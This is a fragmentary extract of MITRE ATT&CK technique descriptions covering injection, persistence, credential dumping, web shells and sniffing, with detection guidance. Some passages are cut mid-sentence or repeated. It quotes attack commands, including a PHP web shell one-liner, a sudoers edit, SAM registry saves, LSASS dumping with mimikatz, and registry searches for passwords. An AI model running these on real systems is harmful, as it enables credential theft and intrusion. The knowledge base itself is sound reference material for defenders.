        Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

        Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [PowerShell](https://attack.mitre.org/techniques/T1086) with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

        Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

        ### Windows

        There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)

        * **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
        * **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
        * **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.
        * **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
        * **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

        ### Mac and Linux

        Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)

        * **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
        * **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
        * **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
        * **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

        Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

        Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

        * Event ID 106 - Scheduled task registered
        * Event ID 140 - Scheduled task updated
        * Event ID 141 - Scheduled task removed

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.

        An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).

      description: "The <code>sudo</code> command \"allows a system administrator
        to delegate authority to give certain users (or groups of users) the ability
        to run some (or all) commands as root or another user while providing an audit
        trail of the commands and their arguments.\" (Citation: sudo man page 2018)
        Since sudo was made for the system administrator, it has some useful configuration
        features such as a <code>timestamp_timeout</code> that is the amount of time
        in minutes between instances of <code>sudo</code> before it will re-prompt
        for a password. This is because <code>sudo</code> has the ability to cache
        credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code>
        with a timestamp of when sudo was last run to determine this timeout. Additionally,
        there is a <code>tty_tickets</code> variable that treats each new tty (terminal
        session) in isolation. This means that, for example, the sudo timeout of one
        tty will not affect another tty (you will have to type the password again).\n\nAdversaries
        can abuse poor configurations of this to escalate privileges without needing
        the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored
        to see if it falls within the <code>timestamp_timeout</code> range. If it
        does, then malware can execute sudo commands without needing to supply the
        user's password. When <code>tty_tickets</code> is disabled, adversaries can
        do this from any tty for that user. \n\nThe OSX Proton Malware has disabled
        <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo
        \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: cybereason
        osx proton). In order for this change to be reflected, the Proton malware
        also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers
        file has <code>tty_tickets</code> enabled by default."

        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)

        <code><?php @eval($_POST['password']);></code>

        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)

        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information, such as <code>nltest /domain_trusts</code>. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the DSEnumerateDomainTrusts() Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1086). The .NET method GetAllTrustRelationships() can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)

        Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.

      x_mitre_detection: Detecting the events leading up to sniffing network traffic
        may be the best method of detection. From the host level, an adversary would
        likely need to perform a man-in-the-middle attack against other devices on
        a wired network in order to capture traffic that was not to or from the current
        compromised system. This change in the flow of information is detectable at
        the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts.
        Detecting compromised network devices is a bit more challenging. Auditing
        administrator logins, configuration changes, and device images is required
        to detect malicious changes.

      description: |-
        Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.

        Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

        Password policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)

      description: "Adversaries may check for the presence of a virtual machine environment
        (VME) or sandbox to avoid potential detection of tools and activities. If
        the adversary detects a VME, they may alter their malware to conceal the core
        functions of the implant or disengage from the victim. They may also search
        for VME artifacts before dropping secondary or additional payloads. \n\nAdversaries
        may use several methods including [Security Software Discovery](https://attack.mitre.org/techniques/T1063)
        to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        by searching for security monitoring tools (e.g., Sysinternals, Wireshark,
        etc.) to help determine if it is an analysis environment. Additional methods
        include use of sleep timers or loops within malware code to avoid operating
        within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n\n###Virtual
        Machine Environment Artifacts Discovery###\n\nAdversaries may use utilities
        such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),
        [PowerShell](https://attack.mitre.org/techniques/T1086), [Systeminfo](https://attack.mitre.org/software/S0096),
        and the [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain
        system information and search for VME artifacts. Adversaries may search for
        VME artifacts in memory, processes, file system, and/or the Registry. Adversaries
        may use [Scripting](https://attack.mitre.org/techniques/T1064) to combine
        these checks into one script and then have the program exit if it determines
        the system to be a virtual environment. Also, in applications like VMWare,
        adversaries can use a special I/O port to send commands and receive output.
        Adversaries may also check the drive size. For example, this can be done using
        the Win32 DeviceIOControl function. \n\nExample VME Artifacts in the Registry(Citation:
        McAfee Virtual Jan 2017)\n\n* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest
        Additions</code>\n* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n*
        <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n\nExample VME files and DLLs
        on the system(Citation: McAfee Virtual Jan 2017)\n\n* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code>
        \n* <code>WINDOWS\\system32\\vboxhook.dll</code>\n* <code>Windows\\system32\\vboxdisp.dll</code>\n\nCommon
        checks may enumerate services running that are unique to these applications,
        installed programs on the system, manufacturer/product fields for strings
        relating to virtual machine applications, and VME-specific hardware/processor
        instructions.(Citation: McAfee Virtual Jan 2017)\n\n###User Activity Discovery###\n\nAdversaries
        may search for user activity on the host (e.g., browser history, cache, bookmarks,
        number of files in the home directories, etc.) for reassurance of an authentic
        environment. They might detect this type of information via user interaction
        and digital signatures. They may have malware check the speed and frequency
        of mouse clicks to determine if it’s a sandboxed environment.(Citation: Sans
        Virtual Jan 2016) Other methods may rely on specific user interaction with
        the system before the malicious code is activated. Examples include waiting
        for a document to close before activating a macro (Citation: Unit 42 Sofacy
        Nov 2018) and waiting for a user to double click on an embedded image to activate
        (Citation: FireEye FIN7 April 2017).\n\n###Virtual Hardware Fingerprinting
        Discovery###\n\nAdversaries may check the fan and temperature of the system
        to gather evidence that can be indicative a virtual environment. An adversary
        may perform a CPU check using a WMI query <code>$q = “Select * from Win32_Fan”
        Get-WmiObject -Query $q</code>. If the results of the WMI query return more
        than zero elements, this might tell them that the machine is a physical one.

        Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.

        ### Windows

        An example command that would obtain details on processes is "tasklist" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.

        ### Mac and Linux

        In Mac and Linux, this is accomplished with the <code>ps</code> command.

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Interaction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).

        It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

        ### Windows

        Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.

        ### Mac

        On Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.

        ### Linux

        On Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.

        to credentials and certain permission levels within an environment. Manipulation
        could consist of modifying permissions, modifying credentials, adding or changing
        permission groups, modifying account settings, or modifying how authentication
        is performed. These actions could also include account activity designed to
        subvert security policies, such as performing iterative password updates to
        subvert password duration policies and preserve the life of compromised credentials.
        In order to create or manipulate accounts, the adversary must already have
        sufficient permissions on systems or the domain.

        Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

        [Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

        Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

        A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

        Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)


        In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      description: "Credential dumping is the process of obtaining account login and
        password information, normally in the form of a hash or a clear text password,
        from the operating system and software. Credentials can then be used to perform Lateral
        Movement and access restricted information.\n\nSeveral of the tools mentioned
        in this technique may be used by both adversaries and professional security
        testers. Additional custom tools likely exist as well.\n\n### Windows\n\n####
        SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains
        local accounts for the host, typically those found with the ‘net user’ command.
        To enumerate the SAM database, system level access is required.\n \nA number
        of tools can be used to retrieve the SAM file through in-memory techniques:\n\n*
        pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n*
        secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry
        with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam
        sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then
        be used to process the SAM database locally to retrieve hashes. (Citation:
        GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid
        501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n####
        Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash,
        used by Windows Vista and newer caches credentials when the domain controller
        is unavailable. The number of default cached credentials varies, and this
        number can be altered per system. This hash does not allow pass-the-hash style
        attacks.\n \nA number of tools can be used to retrieve the SAM file through
        in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n*
        [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe
        can be used to extract from the Registry and Creddump7 used to gather the
        credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using
        PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access
        to a host, the LSA secrets often allows trivial access from a local account
        to domain-based account credentials. The Registry is used to store the LSA
        secrets.\n \nWhen services are run under the context of local or domain users,
        their passwords are stored in the Registry. If auto-logon is enabled, this
        information will be stored in the Registry as well.\n \nA number of tools
        can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe
        \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n*
        secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry
        and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted
        by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows
        10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS
        from Domain Controller\n\nActive Directory stores information about members
        of the domain including devices and users to verify credentials and define
        access rights. The Active Directory domain database is stored in the NTDS.dit
        file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit
        of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following
        tools and techniques can be used to enumerate the NTDS file and the contents
        of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n*
        Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n####
        Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are
        tools that allowed administrators to create domain policies with embedded
        credentials. These policies, amongst other things, allow administrators to
        set local accounts.\n\nThese group policies are stored in SYSVOL on a domain
        controller, this means that any domain user can view the SYSVOL share and
        decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft
        GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used
        to gather and decrypt the password file from Group Policy Preference XML files:\n\n*
        Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n*
        Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn
        the SYSVOL share, the following can be used to enumerate potential XML files.\ndir
        /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n####
        Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials
        are generated and stored in the Local Security Authority Subsystem Service (LSASS)
        process in memory. These credentials can be harvested by a administrative
        user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as
        a common interface to several Security Support Providers (SSPs): A Security
        Support Provider is a dynamic-link library (DLL) that makes one or more security
        packages available to applications.\n\nThe following SSPs can be used to access
        credentials:\n\nMsv: Interactive logons, batch logons, and service logons
        are done through the MSV authentication package.\nWdigest: The Digest Authentication
        protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple
        Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential
        Protection)\nKerberos: Preferred for mutual client-server domain authentication
        in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote
        Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can
        be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n*
        [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory
        techniques, the LSASS process memory can be dumped from the target host and
        analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n*
        <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be
        run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n####
        DCSync\n\nDCSync is a variation on credential dumping which can be used to
        acquire sensitive information from a domain controller. Rather than executing
        recognizable malicious code, the action works by abusing the domain controller's
        \ application programming interface (API) (Citation: Microsoft DRSR Dec 2017)
        (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine
        API samlib.dll) to simulate the replication process from a remote domain controller.
        Any members of the Administrators, Domain Admins, Enterprise Admin groups
        or computer accounts on the domain controller are able to run DCSync to pull
        password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory,
        which may include current and historical hashes of potentially useful accounts
        such as KRBTGT and Administrators. The hashes can then in turn be used to
        create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097)
        (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as
        noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).
        (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been
        included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz
        lsadump Module) Lsadump also includes NetSync, which performs DCSync over
        a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n###
        Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a
        great deal of information regarding the state of the running operating system.
        Processes running with root privileges can use this facility to scrape live
        memory of other running programs. If any of these programs store passwords
        in clear text or password hashes in memory, these values can then be harvested
        for either usage or brute force attacks, respectively. This functionality
        has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179),
        an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002).
        The tool dumps process memory, then harvests passwords and hashes by looking
        for text strings and regex patterns for how given applications such as Gnome
        Keyring, sshd, and Apache use memory to store such authentication artifacts."

        The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

        Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

        * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
        * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>
      x_mitre_system_requirements:
      - Ability to query some Registry locations depends on the adversary's level
        of access. User permissions are usually limited to access of user-related
        Registry keys.

        Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.

        Similar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.

        Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.

        If a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)

        Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)

        Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)

        Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

        Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

        Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.

        When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)).

        Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).

        Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.

        To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.

        may be the best method of detection. From the host level, an adversary would
        likely need to perform a man-in-the-middle attack against other devices on

        the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts.
        Detecting compromised network devices is a bit more challenging. Auditing
        administrator logins, configuration changes, and device images is required
        to detect malicious changes.

        Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.

